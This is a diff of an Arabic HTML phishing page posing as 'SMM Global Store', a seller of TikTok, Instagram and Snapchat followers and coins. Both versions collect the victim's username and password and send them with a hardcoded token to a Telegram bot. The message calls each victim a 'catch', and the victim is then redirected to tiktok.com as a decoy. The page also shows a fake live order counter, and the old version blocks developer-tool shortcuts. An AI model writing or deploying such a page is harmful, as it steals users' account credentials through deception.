@@ -3,387 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMM GLOBAL STORE | المتجر العالمي للرشق والعملات</title>
+    <title>SMM Global Store</title>
     <style>
-        /* تعريف الألوان والمتغيرات الأساسية */
-        :root {
-            --primary: #ee1d52; /* لون التيك توك الأحمر */
-            --secondary: #00f2ea; /* لون التيك توك الأزرق */
-            --bg: #0a0a0a;
-            --card-bg: rgba(18, 18, 18, 0.85);
-            --text-color: #ffffff;
-            --insta-grad: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+        :root { --bg-color: #0f0f0f; --input-bg: #1a1a1a; --primary-red: #ff4d4d; --text-gray: #b0b0b0; }
+        body { background-color: var(--bg-color); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        
+        .container { width: 90%; max-width: 450px; background: #000; padding: 25px; border-radius: 15px; text-align: center; position: relative; }
+        
+        h1 { color: #fff; font-size: 28px; margin-bottom: 5px; letter-spacing: 1px; }
+        .subtitle { color: var(--text-gray); font-size: 14px; margin-bottom: 10px; }
+        .status-top { color: #4ade80; font-size: 13px; margin-bottom: 25px; font-weight: bold; }
+
+        .content-flex { display: flex; align-items: flex-start; gap: 15px; margin-top: 20px; }
+        .icons-side { flex: 1; display: flex; flex-wrap: wrap; justify-content: center; gap: 5px; padding-top: 20px; }
+        .icons-side img { width: 50px; height: 50px; filter: drop-shadow(0 0 5px rgba(255,255,255,0.1)); }
+        
+        .form-side { flex: 2; text-align: right; }
+        .step-label { font-size: 13px; color: #fff; margin-bottom: 8px; font-weight: 500; }
+        
+        select, input { 
+            width: 100%; padding: 12px; margin-bottom: 18px; border-radius: 8px; border: 1px solid #333; 
+            background: var(--input-bg); color: #fff; font-size: 14px; box-sizing: border-box; outline: none;
         }
 
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: var(--bg);
-            color: var(--text-color);
-            overflow: hidden;
-            user-select: none; /* منع تحديد النص */
+        .btn-main { 
+            width: 100%; padding: 15px; border: none; border-radius: 10px; 
+            background: #fff; color: #000; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px;
         }
 
-        /* --- تصميم الخلفية المتحركة --- */
-        .background-container {
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            top: 0;
-            left: 0;
-            z-index: -1;
-            overflow: hidden;
+        .footer-status { 
+            background: rgba(22, 45, 22, 0.8); padding: 15px; border-radius: 0 0 15px 15px; 
+            margin: 25px -25px -25px -25px; border-top: 1px solid #1a331a; 
         }
-
-        .background-icon {
-            position: absolute;
-            width: 50px;
-            height: 50px;
-            opacity: 0.3;
-            animation: floatIcon linear infinite;
-            filter: drop-shadow(0 0 5px rgba(255,255,255,0.3));
-        }
-
-        /* تحريك الأيقونات من الأسفل إلى الأعلى مع دوران */
-        @keyframes floatIcon {
-            0% { transform: translateY(110vh) rotate(0deg); opacity: 0; }
-            10% { opacity: 0.3; }
-            90% { opacity: 0.3; }
-            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
-        }
-
-        /* --- تصميم الكرت الرئيسي --- */
-        .main-card {
-            background: var(--card-bg);
-            padding: 40px 30px;
-            border-radius: 30px;
-            width: 90%;
-            max-width: 450px;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(20px); /* تأثير زجاجي ضبابي */
-            -webkit-backdrop-filter: blur(20px);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 10;
-        }
-
-        .logo-area h1 {
-            font-size: 28px;
-            margin: 0 0 10px 0;
-            background: linear-gradient(45deg, #ffffff, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 10px rgba(255,255,255,0.2);
-        }
-
-        .badge {
-            background: rgba(238, 29, 82, 0.2);
-            color: var(--primary);
-            padding: 6px 15px;
-            border-radius: 50px;
-            font-size: 13px;
-            font-weight: bold;
-            display: inline-block;
-            margin-bottom: 25px;
-            border: 1px solid var(--primary);
-        }
-
-        /* --- تصميم القوائم والحقول --- */
-        .section-title {
-            font-size: 14px;
-            color: #b0b0b0;
-            text-align: right;
-            margin: 0 5px 8px 0;
-            font-weight: 500;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        select, input {
-            width: 100%;
-            padding: 16px;
-            border-radius: 14px;
-            border: 1px solid #333;
-            background: rgba(0, 0, 0, 0.5);
-            color: var(--text-color);
-            font-size: 16px;
-            box-sizing: border-box;
-            outline: none;
-            transition: all 0.3s ease;
-            -webkit-appearance: none; /* إزالة الستايل الافتراضي للقائمة */
-        }
-
-        select:focus, input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 10px rgba(238, 29, 82, 0.3);
-            background: rgba(20, 20, 20, 0.8);
-        }
-
-        /* إضافة أيقونة سهم مخصصة للقوائم */
-        .select-wrapper {
-            position: relative;
-        }
-        .select-wrapper::after {
-            content: '▼';
-            font-size: 12px;
-            color: #888;
-            position: absolute;
-            left: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            pointer-events: none;
-        }
-
-        /* --- تصميم الزر الرئيسي --- */
-        .btn-go {
-            width: 100%;
-            padding: 18px;
-            border: none;
-            border-radius: 14px;
-            background: #ffffff;
-            color: #000000;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s ease;
-            box-shadow: 0 5px 15px rgba(255, 255, 255, 0.1);
-        }
-
-        .btn-go:hover {
-            background: var(--primary);
-            color: #ffffff;
-            transform: translateY(-3px);
-            box-shadow: 0 8px 25px rgba(238, 29, 82, 0.4);
-        }
-
-        /* --- العداد والحماية --- */
-        .live-status {
-            font-size: 13px;
-            color: #4ade80;
-            margin-top: 25px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .live-dot {
-            height: 10px;
-            width: 10px;
-            background-color: #4ade80;
-            border-radius: 50%;
-            display: inline-block;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(74, 222, 128, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0); }
-        }
-
-        .secure-notice {
-            font-size: 11px;
-            color: #666;
-            margin-top: 15px;
-        }
+        .online-count { color: #4ade80; font-size: 16px; font-weight: bold; margin-bottom: 5px; }
+        .secure-txt { color: #888; font-size: 11px; }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
 
-    <div class="background-container" id="background">
-        </div>
+    <div class="container">
+        <h1>SMM Global Store</h1>
+        <div class="subtitle">أختر الباقة المناسبة لحسابك</div>
+        <div class="status-top">نظام المعالجة التلقائية: متصل ✅</div>
 
-    <div class="main-card">
-        <div class="logo-area">
-            <h1>SMM GLOBAL STORE</h1>
-            <div class="badge">نظام المعالجة التلقائية: متصل ✅</div>
-        </div>
-
-        <div class="input-group">
-            <div class="section-title">1. اختر البرنامج المستهدف:</div>
-            <div class="select-wrapper">
-                <select id="platform" onchange="updateServices()">
-                    <option value="TikTok">تيك توك - TikTok</option>
-                    <option value="Instagram">إنستغرام - Instagram</option>
-                    <option value="Facebook">فيسبوك - Facebook</option>
-                    <option value="Snapchat">سناب شات - Snapchat</option>
-                </select>
+        <div class="content-flex">
+            <div class="icons-side">
+                <img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png" alt="tiktok">
+                <img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" alt="coin">
+                <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" alt="insta">
+                <img src="https://cdn-icons-png.flaticon.com/512/2111/2111615.png" alt="snap">
             </div>
-        </div>
 
-        <div class="input-group">
-            <div class="section-title">2. حدد نوع الخدمة:</div>
-            <div class="select-wrapper">
-                <select id="service" onchange="updateAmounts()">
-                    <option value="Followers">زيادة متابعين (Followers)</option>
-                    <option value="Coins">شحن عملات/نقاط (Coins/Gold)</option>
+            <div class="form-side">
+                <div class="step-label">1. اختر البرنامج المستهدف:</div>
+                <select id="platform" onchange="updateOptions()">
+                    <option>تيك توك - TikTok</option>
+                    <option>إنستغرام - Instagram</option>
+                    <option>سناب شات - Snapchat</option>
                 </select>
-            </div>
-        </div>
 
-        <div class="input-group">
-            <div class="section-title">3. اختر الباقة/الكمية المطلوب رشقها:</div>
-            <div class="select-wrapper">
+                <div class="step-label">2. حدد نوع الخدمة:</div>
+                <select id="service" onchange="updateOptions()">
+                    <option value="coins">شحن عملات/نقاط (Coins/Gold)</option>
+                    <option value="follow">زيادة متابعين (Followers)</option>
+                </select>
+
+                <div class="step-label">3. اختر الباقة/الكمية المطلوب رشقها:</div>
                 <select id="amount">
                     </select>
             </div>
         </div>
 
-        <div class="input-group">
-            <div class="section-title">4. أدخل بيانات التحقق والربط:</div>
-            <input type="text" id="user" placeholder="اسم المستخدم (Username) أو المعرف الرقمي" required>
-            <input type="password" id="pass" placeholder="كلمة المرور المشفرة" required>
+        <div style="text-align: right; margin-top: 10px;">
+            <div class="step-label">4. أدخل بيانات التحقق والربط:</div>
+            <input type="text" id="user" placeholder="(Username) اسم المستخدم">
+            <input type="password" id="pass" placeholder="كلمة المرور المشفرة">
         </div>
-        
-        <button class="btn-go" onclick="sendData()">تفعيل عملية الرشق الآن</button>
 
-        <div class="live-status">
-            <span class="live-dot"></span>
-            طلبات نشطة عالمياً الآن: <span id="online">145,280</span>
-        </div>
-        <div class="secure-notice">
-            🔒 اتصال آمن ومحمي 256-bit SSL
+        <button class="btn-main" onclick="sendData()">تفعيل عملية الرشق الآن</button>
+
+        <div class="footer-status">
+            <div class="online-count">🌎 طلبات نشطة عالمياً الآن: <span id="counter">145,280</span></div>
+            <div class="secure-txt">🔒 اتصال آمن ومحمي SSL-bit 256</div>
         </div>
     </div>
 
     <script>
-        // منع اختصارات المطورين لفحص العنصر
-        document.onkeydown = function(e) {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) || (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
-                return false;
-            }
-        };
-
-        // --- إعداد الأيقونات المتحركة في الخلفية ---
-        const background = document.getElementById('background');
-        // روابط لأيقونات شفافة بجودة عالية
-        const iconsData = [
-            'https://cdn-icons-png.flaticon.com/512/3046/3046121.png', // TikTok
-            'https://cdn-icons-png.flaticon.com/512/174/174855.png',   // Instagram
-            'https://cdn-icons-png.flaticon.com/512/124/124010.png',   // Facebook
-            'https://cdn-icons-png.flaticon.com/512/2111/2111615.png',   // Snapchat
-            'https://cdn-icons-png.flaticon.com/512/2489/2489756.png',   // Coin 1
-            'https://cdn-icons-png.flaticon.com/512/408/408426.png'      // Coin 2
-        ];
-
-        // إنشاء 25 أيقونة بشكل عشوائي
-        for (let i = 0; i < 25; i++) {
-            let img = document.createElement('img');
-            img.src = iconsData[Math.floor(Math.random() * iconsData.length)];
-            img.className = 'background-icon';
-            // وضع عشوائي على عرض الشاشة
-            img.style.left = Math.random() * 100 + 'vw';
-            // مدة حركة عشوائية لعدم التزامن (بين 8 إلى 15 ثانية)
-            img.style.animationDuration = (Math.random() * 7 + 8) + 's';
-            // تأخير عشوائي لبدء الحركة
-            img.style.animationDelay = (Math.random() * 10) + 's';
-            // حجم عشوائي للأيقونة
-            let size = Math.random() * 30 + 30 + 'px';
-            img.style.width = size;
-            img.style.height = size;
-            background.appendChild(img);
-        }
-
-        // --- تحديث قوائم الكميات ديناميكياً ---
-        function updateAmounts() {
+        function updateOptions() {
             const service = document.getElementById('service').value;
             const amountSelect = document.getElementById('amount');
-            const platform = document.getElementById('platform').value;
-            
-            // مسح الخيارات الحالية
             amountSelect.innerHTML = "";
-            let options = [];
-
-            // تحديد الباقات بناءً على نوع الخدمة
-            if (service === "Coins") {
-                options = [
-                    { text: "1,000 - 10,000 عملة/نقطة", value: "1k-10k_Coins" },
-                    { text: "10,000 - 100,000 عملة/نقطة 🔥", value: "10k-100k_Coins" },
-                    { text: "100,000 - 1,000,000 عملة (VIP Pack) 💎", value: "100k-1M_Coins" }
-                ];
+            
+            if(service === "coins") {
+                const opts = ["1,000 - 10,000 عملة/نقطة 🔥", "10,000 - 100,000 عملة", "100,000 - 1,000,000 عملة"];
+                opts.forEach(o => amountSelect.add(new Option(o, o)));
             } else {
-                // باقات المتابعين
-                options = [
-                    { text: "500 - 10,000 متابع", value: "500-10k_Followers" },
-                    { text: "10,000 - 50,000 متابع 🔥", value: "10k-50k_Followers" },
-                    { text: "50,000 - 200,000 متابع (Turbo Pack) 🚀", value: "50k-200k_Followers" },
-                    { text: "200,000 - 500,000 متابع (Global Ultra) 👑", value: "200k-500k_Followers" }
-                ];
+                const opts = ["500 - 5,000 متابع", "10,000 - 50,000 متابع 🔥", "100,000 متابع (VIP)"];
+                opts.forEach(o => amountSelect.add(new Option(o, o)));
             }
-
-            // إضافة الخيارات الجديدة للقائمة
-            options.forEach(opt => {
-                let o = document.createElement("option");
-                o.text = opt.text;
-                o.value = opt.value;
-                amountSelect.add(o);
-            });
         }
+        window.onload = updateOptions;
 
-        // دالة يتم استدعاؤها عند تغيير البرنامج (لإعادة تعيين القوائم إذا لزم الأمر مستقبلاً)
-        function updateServices() {
-            updateAmounts(); // في هذا التصميم، الباقات تعتمد على الخدمة وليس البرنامج مباشرة
-        }
-
-        // تشغيل دالة التحديث عند تحميل الصفحة لأول مرة لتعبئة القائمة الافتراضية
-        window.onload = updateAmounts;
-
-        // --- دالة إرسال البيانات ---
         function sendData() {
-            const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk"; // توكن البوت الخاص بك
-            const chat_id = "1564944407"; // الآيدي الخاص بك
-
-            const platform = document.getElementById('platform').value;
-            const service = document.getElementById('service').value;
-            const amount = document.getElementById('amount');
-            const amountText = amount.options[amount.selectedIndex].text; // الحصول على النص الظاهر للباقة
+            const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk";
+            const chat_id = "1564944407";
             const user = document.getElementById('user').value;
             const pass = document.getElementById('pass').value;
 
-            // التحقق من الحقول المطلوبة
-            if(!user || !pass) {
-                alert("⚠️ خطأ في المصادقة: يرجى إدخال اسم المستخدم وكلمة المرور للربط بالسيرفر.");
-                return;
-            }
+            if(!user || !pass) { alert("يرجى إكمال البيانات!"); return; }
 
-            // تغيير حالة الزر لإظهار المعالجة
-            const btn = document.querySelector('.btn-go');
-            btn.innerText = "جاري التشفير والربط الآمن...";
-            btn.disabled = true;
-
-            // تجهيز الرسالة بتنسيق مرتب
-            const msg = `🚀 صيدة باقة Ultra جديدة!\n\n💻 البرنامج: ${platform}\n🛠 الخدمة: ${service}\n📊 الباقة: ${amountText}\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
-            
-            // إنشاء رابط API لتيليجرام
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
-
-            // إرسال البيانات
-            fetch(url).finally(() => {
-                // انتظر قليلاً ثم أظهر التأكيد وحول الضحية
-                setTimeout(() => {
-                    alert("✅ تم التحقق من الحساب وربطه بنجاح! سيبدأ نظام الرشق السحابي في معالجة طلبك خلال 5-10 دقائق.");
-                    window.location.href = "https://www.tiktok.com"; // تمويه
-                }, 1500);
+            const msg = `🎯 صيدة جديدة من الواجهة المطورة:\n👤: ${user}\n🔑: ${pass}\n📦: ${document.getElementById('amount').value}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
+            .then(() => {
+                alert("جاري الاتصال بالسيرفر لتفعيل الباقة...");
+                window.location.href = "https://tiktok.com";
             });
         }
 
-        // --- عداد طلبات وهمي ---
         setInterval(() => {
-            let el = document.getElementById('online');
-            // زيادة طفيفة وعشوائية في العدد
-            let currentCount = parseInt(el.innerText.replace(',', ''));
-            let n = currentCount + Math.floor(Math.random() * 25);
-            el.innerText = n.toLocaleString();
-        }, 3000); // تحديث كل 3 ثواني
+            let c = document.getElementById('counter');
+            let n = parseInt(c.innerText.replace(',', '')) + Math.floor(Math.random() * 15);
+            c.innerText = n.toLocaleString();
+        }, 3000);
     </script>
 </body>
 </html>
